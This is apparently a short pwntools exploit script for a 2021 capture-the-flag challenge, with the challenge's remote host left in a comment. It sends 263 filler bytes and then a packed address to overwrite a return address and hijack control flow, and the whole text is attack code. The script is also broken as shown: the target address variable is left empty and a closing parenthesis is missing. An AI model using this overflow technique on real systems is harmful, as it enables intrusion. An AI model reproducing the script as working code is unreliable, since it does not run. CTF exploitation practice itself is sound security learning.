from pwn import *
# https://storage.googleapis.com/ctfd-uploads/filtered.tar.gz_9a6cb1b3eafce70ff549ba6b942f34a9.gz
## p = remote("chalp.hkcert21.pwnable.hk",28028)
p = process("a.out")
p.recvuntil("service.")
gs_function=
p.sendline(b"a"*263+p64(gs_function)
p.interactive()
